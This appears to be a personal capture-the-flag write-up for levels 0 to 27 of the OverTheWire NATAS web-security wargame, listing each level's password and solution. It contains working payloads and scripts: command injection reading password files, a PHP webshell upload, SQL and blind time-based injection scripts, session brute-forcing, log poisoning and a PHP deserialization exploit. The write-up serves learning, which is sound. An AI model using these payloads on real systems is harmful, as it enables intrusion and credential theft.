NATAS-Over The Wire
===================

level-0:
-------
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto 

solution: look the page source

level-1:
--------
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

solution: looking athe pagesource,right-clicking is blocked so we have to use ctrl+u key combination to view page-source 

level-2:
--------
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


solution: looking trough the page source we find a image link ``files/pixel.png`` ,when we look at the ``/files`` dir-listing is enabled 	there is user.txt and you can find the password inside that file 


level-3:
--------
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

solution: look at the robots.txt you can find ``/s3cr3t/`` when we go to that we can see a user.txt and we can see the password inside that file

	
level-4:
-------
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 

solution: we have to change the Referer header to ``http://natas5.natas.labs.overthewire.org/``

level-5:
--------
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

solution: we want to change the cookiee "loggedin" from 0 to 1.


level-6:
--------

password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

solution: here we want to pass the correct secret,by looing into the "view sourcecode" we can see the php source-code and in that it is including ``includes/secret.inc`` to the page so i browsed to that page and in the source of the page we can find the secret
	
level-7:
-------

password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

solution: LFI,pyaload to the page parameter ``/../../../etc/natas_webpass/natas8``

level-8:
-------

password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 

solution: looking through the source of the page our input is passed to a ``encodeSecret`` function and it compares to a string in the code so we just have to reverse the function , take that string and then do hex2bin() and then strrrev() and then base64_decode(), and we will get the serect
	
level-9:
-------

password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

solution: by looking through the php sourcecode we can see that our input is passed into passthru() finction which will exicute the grep command ,so we can have os command injection vulnerablity here and just by putting ``;`` after that what commant we give will be exicuted on the server

payload: 
```bash
; cat /../../../etc/natas_webpass/natas10
```
	
level-10:
-------

password:  U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

solution: here there are some fileter so we cannot directly inject commands,so we can use the grep command to show all the text in ``/../../../etc/natas_webpass/natas10`` file

payload: ``.* ../../../../etc/natas_webpass/natas11``

level-11:
-------

password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

solution: when we view the php  source code of the page ,it xor encrypting the jason encoded "showpassword"=>"no", "bgcolor"=>"#ffffff" and then base64 endcoded and store it as cookie ,it is checking that "showpassword" value is "yes" only then we can see the password,so we can decode the cookie using the same function to get the xor key and change the ``"showpassword"=>"yes"`` in that arry,then xor encrypt and base64 encode and put it as the cookie data value

final payload: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK(set this as the data cookie value)

level-12:
-------

password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 

solution: in the website there is an upload function and we can upload a php file ,but the filename and extension is generated by the webapp ,we can change the extention using burp suite

final php code:
```php
<?php system("cat /../../../../etc/natas_webpass/natas13"); ?>
```


level-13:
-------

password:  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

solution:  here it cheks for an image type so we can add some magic bytes of the jpeg files to pass that check 
	
level-14:
-------

password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

solution: sql injection

payload :   ``" or 1=1 --+``(put it in the input feild)
	
level-15:
-------
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

solution: here blind sql injection is possible , it check for the username exists ,we can see that nata16 exists so we want to find the password of natas16
	
python exploit:
```python
#!/usr/bin/python3

import requests
import string


req=requests.Session()
url='http://natas15.natas.labs.overthewire.org/index.php'
auth={'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
req.headers.update(auth)
r=req.post(url,headers=auth)
p="natas16 \" and ord(substr(password,{},1))={}#"
chrs=string.ascii_letters+string.digits
password=''
for j in range(1,33):
	for i in chrs:
		i=ord(i)
		payload=p.format(j,i)
		data={"username":payload}
		r1=req.post(url,data=data)
		if "This user exists." in r1.text:
			  password+=chr(i)
			  break
			
print(password)

```

level-16:
-------

password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

solution: 
```python
#!/usr/bin/python3
import requests
import string

req=requests.Session()
auth={'Authorization' :'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
url='http://natas16.natas.labs.overthewire.org/index.php'
req.headers.update(auth)
payload='?needle=bells$(grep ^{} /etc/natas_webpass/natas17 )&submit=Search'
chars='bcdghkmnqrswAGHNPQSW035789'
password=''

for j in range(33):
	for i in chars:
		a=password+i
		p=payload.format(a)
		u=url+p
		r=req.get(u)
		if 'bells' not in r.text:
			password+=i
			print(password)
			break
			
```

level-17:
-------

password:  xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

solution: 
```python
#!/usr/bin/python3

import requests
import string


req=requests.Session()
url='http://natas17.natas.labs.overthewire.org/index.php'
auth={'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
req.headers.update(auth)
r=req.post(url,headers=auth)
p="natas18\" and ord(substr(password,{},1))={} and sleep(2) #"
chrs=string.ascii_letters+string.digits
password=''
for j in range(1,33):
    for i in chrs:
        i=ord(i)
        payload=p.format(j,i)
        print(payload)
        data={"username":payload}
        r1=req.post(url,data=data)
        time=r1.elapsed.seconds
        if time==2:
            print(j,chr(i))
            password+=chr(i)
            break




print(password)

```
level-18
---------

password : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

solution : in this when we look through the source code and it is checking we are admin by checking our ``phpsessionid`` ,the web app will create a random number between 1,640 as phpsession id, for some id it will set the admin session variable to 1 to we have to bruteforce the sessionid of admin using a proxy like python or web,by sending requests one by one  with phpsessionid value between 1 to 640 .when we set 119 as phpsession id will get the crentials


level-19
-------

password : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

solution :
```python
#!/usr/bin/python3

import requests
import string
import codecs


req=requests.Session()
url='http://natas19.natas.labs.overthewire.org/index.php'
auth={'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='}
req.headers.update(auth)


for i in range(1,640):
    p=str(i)+'-admin'
    payload=bytes.hex(bytes(p,'utf-8'))
    cookies={'PHPSESSID':payload}
    print(cookies)
    r=req.get(url,cookies=cookies)
    le=len(r.text)
    if le>1050:
        print(r.text)
        break
        

```

level-20
---------

In this challenge we have to be admin to get the password for next leve ,it is check the session variable 'admin' equal to 1 ,the session ,from the source code we can see that the session variables are store into a file that is taken form our input ,and the session varible are read form that file itself line by line ,each line will be set as a new session variable 
```php
function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
} 
```

we can add a new line to that file like admin and value to be 1 so when it reads that file the admin session variable will be set

payload:``admin%OAadmin 1``

password : **IFekPyrQXftziDEsUr3x21sYuahypdgJ**


level-21
---------
natas21.natas.labs.overthewire.org

http://natas21-experimenter.natas.labs.overthewire.org/
```php
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>'; 
```

payload :``align=center&fontsize=100%25&admin=1&bgcolor=yellow&submit=Update``
![image](https://user-images.githubusercontent.com/61080375/111584443-dffa9780-87e3-11eb-9350-8e0a8fc56689.png)




password :**chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ**

level-22
---------


sent a request with the  revelio as get parametr we can use burp to see the response 
``natas22.natas.labs.overthewire.org/?revelio=qwerqwe``
password : **D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE**

level-23
---------

from the source , we have to pass something with``iloveyou`` in the input fied and it should be greater that 10 also

form the php manul we cna see that it if number in the begining of a string is valid then its value will be take as that number or  else 0 so i put 11 in fort as it is greater than 10

payload ``11iloveyou``

password :**OsRmXFguozKpTZZ5X14zNO43379LZveg**


level-24
--------
From the source of the page we can see that our input is sompared with anothersrting using ``strcmp()`` if the return value of strcmp() is to be 0 only then we will get the password 
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
so it we pass the an array to  strcmp() it will return '0' ,therefor we can pass the password parameter as an array
paylod :http://natas24.natas.labs.overthewire.org/?passwd[]=00000

password **GHF6X7YwACaYYssHVY05cFq83hRktl4c**

level-25
--------

```php
 function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
```

In the web app it is fecting the language file when we change the language, so we can try path travesal attack
```php
function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
 ```
But form the soure the ``safeinclude()`` dose a check for path-traversal ,like if the lang parameter has ``../`` it will be replace with '',which means it will be removed ,we can bypass this check by using ``..././`` then the replace will make the perfect ``../`` 
then we can try to access the password page of  natas26,form the previous challenges we know that it is in the ``etc/natas_webpass/natas26`` but ther is also a check  for that if the lang parameter has the word ``natas_webpass`` it will not be processed and the program will exit, so we cannot get to that dir

but when we check the source we can see a logRequest() function
```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```
in this function it is opening the log file  and writing  the log message inside it ,it also include time and ``USER AGENT`` in that file
so we cat try to acess that file (the the file name is natas25_(OURSESSIONID).log)
```http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_SESSIONID.log```

we will get the response

![image](https://user-images.githubusercontent.com/61080375/111745412-8ad98700-88b2-11eb-928c-b192e9423363.png)

so here we can acces that file,now we can try changing the ``user-agent`` header to something else as it is  showing in that response, we can use burp for that .
it is relfecting in that page so as it is including the file i tried some php code in the user agent field it worked!!

so we can now run system php command to get that password file

![image](https://user-images.githubusercontent.com/61080375/111745925-50bcb500-88b3-11eb-8fee-bfbb143ab328.png)
 
 
and we got the password

password:**oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T**

level-26
---------
In the challenge we can see  a web application which draws and save a png image form our input as co-ordinates and then when we look at the source 
we can see that our input is taken as array and then serilise and store it as cookies

```php
function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
```
if the cookie exists then it unserialize and get the coordinated from that cookies 
The main thing to notice is that the use of ``unserialize()`` is unsafe ,like it is directing taking the cookie(which we can change) and unserialize

we can also see a Logger class in that source
```php
 class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
```
In the class there are those ``__constuct()`` and ``__destruct()`` function which are called 'magic methods' of php ,which calls itself when the class is used

In the above class bothe the function writes log msg to a file , since we have the unsirelize() function we can have object injection aka [php deserilization attack](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

we can change the file to which we want ,but we can put that file img dir which we have acess to and we write a php file to show the contenst of password file
``exploit script``
```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="heyyyyyy\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile ="img/info.php";
    }
}


echo base64_encode(serialize(new Logger()))."\n";

?>

```
this will create the serilized object  with base-64 encoding ,take the output ,url encode it and change the cookie value to our paylod



and vist the infor.php in the img dir


![image](https://user-images.githubusercontent.com/61080375/111804798-6b644d80-88f6-11eb-9cb3-360db65de7eb.png)



password : **55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ**

level-27
---------

when we  look through the soruce of the page we can see several functions ,when we enter a user name and password it 
it checks if it is a valid user or not by ``validUser()`` function  and if it retuns true then it check crendtials ,check if the password is is correct for that usrname , and if the that check is passed then it will dump data from the database which is our username and password.
every function in that source fetches data form the database ,but the mysql_real_escape_string is passed on to the variables we pass so there is less possibility of SQLI

```php
function dumpData($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!  
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
} 
```


when looking through the ``dumpData()`` function  we can see that  it is taking the data form the database where username is eqal to the username we entered 
and checks if the number of rows of the result of that query is greater that zero ,and the in that while loop it is printing each row of the result

we want to get the password of natas28 

as the dumData() will return all the data of a user which has that username ,we can try to create user with the username ``natas28`` ,but it is not that easy

as it check for the username already exists or not,we want to bypass that check 

in mysql when we insert something into the database ,if the lenght value given is greater than the limit of that value,it will add the give value only up that specified lenght
so here the sqlquer to create the database was also given
```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
); 
```
here we can see that max length that would we add is 64 ,so we want to bypass the validuser check and want to insert a user with the name ``natas28``
so we can add spaces up to the mas lenght and add any char after that so that will by pass the vlaiduser check and only the sql will only insertthe max lenght


![image](https://user-images.githubusercontent.com/61080375/112014676-20924200-8b51-11eb-9634-0ac099e08c0e.png)


![image](https://user-images.githubusercontent.com/61080375/112014560-05bfcd80-8b51-11eb-9a3d-6dbc1fcf8431.png)


password=**JWwR438wkgTsNKBbcJoowyysdM82YjeF**
	
	
	
	
	

